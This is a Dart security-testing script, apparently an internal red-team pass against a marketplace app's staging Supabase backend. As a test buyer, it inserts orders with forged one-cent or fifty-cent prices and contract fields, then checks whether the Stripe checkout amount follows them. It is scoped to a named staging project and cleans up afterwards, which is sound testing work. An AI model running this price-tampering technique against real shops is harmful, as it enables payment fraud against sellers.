// Pass 6 — shipping allowlist + poisoned contract → Stripe Session amount.
import 'dart:convert';
import 'dart:io';

import 'package:http/http.dart' as http;

import 'live_ops_staging_client.dart';

const stamp = '20260830T1443';
const tag = 'RTI6-$stamp';
const projectMust = 'fxdknzrqjenzqcvnwqqq';

final attacks = <Map<String, dynamic>>[];

void logA(String k, Object v) {
  attacks.add({'k': k, 'v': v});
  stdout.writeln('$k :: $v');
}

String clip(String s, [int n = 500]) {
  final t = s.replaceAll(RegExp(r'\s+'), ' ').trim();
  return t.length <= n ? t : '${t.substring(0, n)}…';
}

void main() async {
  final env = loadLiveOpsStagingEnv();
  final url = normalizeSupabaseProjectUrl(envRequire(env, 'SUPABASE_URL'));
  if (!url.contains(projectMust)) exit(2);
  final anon = envRequire(env, 'SUPABASE_ANON_KEY');
  final svc = envRequire(env, 'SUPABASE_SERVICE_ROLE_KEY');
  final buyerId = envRequire(env, 'LIVE_OPS_TEST_BUYER_ID');
  final sellerId = envRequire(env, 'LIVE_OPS_TEST_SELLER_ID');
  final admin = LiveOpsStagingClient(
    url: url,
    anonKey: anon,
    serviceRoleKey: svc,
  );
  final buyerTok = await admin.signIn(
    email: envRequire(env, 'LIVE_OPS_TEST_BUYER_EMAIL'),
    password: envRequire(env, 'LIVE_OPS_TEST_BUYER_PASSWORD'),
  );

  Map<String, String> hUser() => {
        'apikey': anon,
        'Authorization': 'Bearer $buyerTok',
        'Content-Type': 'application/json',
        'Prefer': 'return=representation',
      };
  Map<String, String> hSvc() => {
        'apikey': svc,
        'Authorization': 'Bearer $svc',
        'Content-Type': 'application/json',
        'Prefer': 'return=representation',
      };

  final prod = await admin.insert('products', {
    'seller_id': sellerId,
    'title': '$tag 42.00',
    'price': 42.00,
    'quantity': 5,
    'is_sold': false,
    'list_on_marketplace': true,
    'description': tag,
  });
  final pid = prod['id'].toString();

  Future<Map<String, dynamic>?> svcOrder(String id) async {
    final r = await http.get(
      Uri.parse('$url/rest/v1/orders?id=eq.$id&select=*&limit=1'),
      headers: hSvc(),
    );
    final d = jsonDecode(r.body);
    if (d is List && d.isNotEmpty) {
      return Map<String, dynamic>.from(d.first as Map);
    }
    return null;
  }

  Future<void> run({
    required String name,
    required Map<String, dynamic> order,
    required Map<String, dynamic> checkout,
  }) async {
    final ins = await http.post(
      Uri.parse('$url/rest/v1/orders'),
      headers: hUser(),
      body: jsonEncode(order),
    );
    logA('${name}_insert', '${ins.statusCode} ${clip(ins.body, 200)}');
    String? oid;
    try {
      final d = jsonDecode(ins.body);
      if (d is List && d.isNotEmpty) oid = (d.first as Map)['id']?.toString();
    } catch (_) {}
    if (oid == null) return;
    final live = await svcOrder(oid);
    logA('${name}_sealed', {
      'id': oid,
      'status': live?['status'],
      'unit': live?['contract_unit_cents'],
      'qty': live?['contract_qty'],
      'price': live?['price_total'],
      'ship': live?['shipping_method'],
      'pm': live?['payment_method'],
    });
    checkout['order_id'] = oid;
    checkout['buyer_id'] = buyerId;
    final chk = await http.post(
      Uri.parse('$url/functions/v1/create-payment-intent'),
      headers: {
        'apikey': anon,
        'Authorization': 'Bearer $buyerTok',
        'Content-Type': 'application/json',
      },
      body: jsonEncode(checkout),
    );
    logA('${name}_checkout', '${chk.statusCode} ${clip(chk.body, 500)}');
    try {
      final cb = jsonDecode(chk.body);
      if (cb is Map) {
        logA('${name}_session', {
          'http': chk.statusCode,
          'amount_total': cb['amount_total'],
          'session': cb['checkoutSessionId'],
          'url': cb['checkoutUrl'] != null ? 'present' : null,
          'error': cb['error'],
        });
      }
    } catch (_) {}
    try {
      await admin.patch('orders', 'id=eq.$oid', {'status': 'cancelado'});
    } catch (_) {}
  }

  await run(
    name: 'cents1_hand_body',
    order: {
      'buyer_id': buyerId,
      'seller_id': sellerId,
      'product_id': pid,
      'quantity': 1,
      'price_total': 0.01,
      'status': 'reserva_pendente',
      'payment_method': 'pagamento na app',
      'contract_unit_cents': 1,
      'contract_qty': 1,
    },
    checkout: {'shipping_method': 'mao', 'amount': 1},
  );

  await run(
    name: 'cents1_hand_sealed',
    order: {
      'buyer_id': buyerId,
      'seller_id': sellerId,
      'product_id': pid,
      'quantity': 1,
      'price_total': 0.01,
      'status': 'reserva_pendente',
      'payment_method': 'pagamento na app',
      'contract_unit_cents': 1,
      'contract_qty': 1,
      'shipping_method': 'mao',
    },
    checkout: {'shipping_method': 'mao'},
  );

  await run(
    name: 'proposta50_hand',
    order: {
      'buyer_id': buyerId,
      'seller_id': sellerId,
      'product_id': pid,
      'quantity': 1,
      'price_total': 0.50,
      'status': 'reserva_pendente',
      'payment_method': 'proposta',
      'shipping_method': 'mao',
    },
    checkout: {'shipping_method': 'mao'},
  );

  await run(
    name: 'proposta50_ctt',
    order: {
      'buyer_id': buyerId,
      'seller_id': sellerId,
      'product_id': pid,
      'quantity': 1,
      'price_total': 0.50,
      'status': 'reserva_pendente',
      'payment_method': 'proposta',
      'shipping_method': 'ctt',
    },
    checkout: {'shipping_method': 'ctt'},
  );

  await run(
    name: 'catalog_control_hand',
    order: {
      'buyer_id': buyerId,
      'seller_id': sellerId,
      'product_id': pid,
      'quantity': 1,
      'price_total': 42.00,
      'status': 'reserva_pendente',
      'payment_method': 'pagamento na app',
      'shipping_method': 'mao',
    },
    checkout: {'shipping_method': 'mao'},
  );

  try {
    await admin.patch('products', 'id=eq.$pid', {
      'list_on_marketplace': false,
      'quantity': 0,
    });
  } catch (_) {}

  Directory('tool/redteam_indep_cega_20260830T1443').createSync(recursive: true);
  File('tool/redteam_indep_cega_20260830T1443/pass6.json').writeAsStringSync(
    const JsonEncoder.withIndent('  ').convert({'stamp': stamp, 'attacks': attacks}),
  );
  stdout.writeln('PASS6 written');
}
